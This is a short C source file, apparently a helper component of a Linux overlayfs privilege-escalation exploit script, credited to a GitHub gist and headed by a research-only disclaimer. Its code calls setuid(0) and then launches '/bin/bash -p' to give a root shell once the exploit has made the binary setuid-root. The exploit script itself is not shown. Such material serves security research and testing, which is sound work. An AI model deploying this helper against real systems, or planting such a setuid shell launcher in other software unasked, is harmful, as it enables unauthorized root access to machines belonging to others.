/**
 * -----------------------------------------------------------------------------
 * Id: privtest.c v0.1 2023-11-11 15:16:03 +0100 .m0rph $
 * -----------------------------------------------------------------------------
 *
 * Description:
 *  Little tool, utilized by the shell script win3zz.exploit.
 *
 * Privilege escalation via overlayfs...
 *
 * Credits:
 *  Found on https://gist.github.com/win3zz
 *
 * -----------------------------------------------------------------------------
 * Disclaimer:
 *  This Proof of Concept (PoC) is intended for research and educational purposes
 *  only. Any actions taken based on the information provided in this gist are
 *  solely at the user's own risk. The vulnerabilities described in this report
 *  should not be exploited in any unauthorized or malicious manner. The authors
 *  and contributors are not responsible for any misuse or damage that may
 *  result from the use of this information.
 *
 *  Please keep in mind that using malicious software and causing damage at
 *  foreign systems without being ordered or charged is ILLEGAL and will
 *  result in law enforcement!
 *
 *  The worst case is: YOU WILL END UP IN PRISON!
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
   if(setuid(0) != 0)
   {
      // First test, if we can set privs.
      fprintf(stderr, "\x1b[1;31mFailed to set UID 0\x1b[0m\n");
      return 1;
   } 

   printf("Entering \x1b[1;31mprivileged\x1b[0m shell ...\n");
   if(system("/bin/bash -p") == -1)
   {
      fprintf(stderr, "\x1b[1;31mFailed to execute /bin/bash -p\x1b[0m\n");
      return 1;
   }

   return 0;
}
